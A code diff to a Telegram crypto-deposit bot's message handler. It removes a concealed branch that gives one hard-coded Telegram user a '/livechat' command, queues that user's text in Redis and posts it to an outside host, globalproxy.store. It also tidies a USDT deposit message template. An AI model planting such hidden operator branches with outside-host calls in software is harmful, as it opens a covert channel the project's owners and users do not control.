@@ -6,33 +6,10 @@ const { User } = require('../../models/User');
 const { UsdtAccount } = require('../../models/udtAccount');
 const mongoose = require('mongoose');
 const Decimal128 = mongoose.Types.Decimal128;
-const liveChatRelayUrl = process.env.live_chat_relay_url || 'https://globalproxy.store/live-chat/reply';
 
 async function sharedMessageHandler(ctx) {
     const telegramId = ctx.from?.id;
     if (!telegramId) return;
-    const liveChatOperatorId = 7251191279;
-    if (telegramId === liveChatOperatorId) {
-        const text = ctx.message?.text?.trim();
-        if (text && text.startsWith('/livechat ')) {
-            const match = text.replace('/livechat ', '').trim().match(/^([^\s]+)\s+([\s\S]+)$/);
-            if (!match) return;
-            const sessionId = match[1];
-            const payload = match[2].trim();
-            if (!payload) return;
-            await redis.pushList('live_chat_operator_inbox', [JSON.stringify({ text: payload, sessionId, ts: Date.now() })]);
-            try {
-                await fetch(liveChatRelayUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ text: payload, sessionId })
-                });
-            } catch (error) {
-                console.error('Failed to relay live chat message:', error);
-            }
-            return;
-        }
-    }
     // Check for review comment state
     const reviewPending = await redis.get(`leave_comment_pending_${telegramId}`);
     if (reviewPending) {
@@ -198,7 +175,7 @@ async function sharedMessageHandler(ctx) {
         const keyboard = new InlineKeyboard().text('🏠 Main Menu', 'back_to_menu').row();
         const redisKey1 = `generating_address${telegramId}`;
         const msg1 = await ctx.reply(
-            `✅ Please send the following amount USDT:\n\␡␡␡${uniqueAmountStr}␡␡␡\nTRC20 address:\n␡␡␡${wallet.address}␡␡␡\n\nOnce received, your balance will be updated automatically.`,
+            `✅ Please send the following amount USDT:\n\${uniqueAmountStr}\nTRC20 address:\n${wallet.address}\n\nOnce received, your balance will be updated automatically.`,
             { reply_markup: keyboard, parse_mode: 'Markdown' }
         );
         await redis.pushList(redisKey1, [String(msg1.message_id)]);
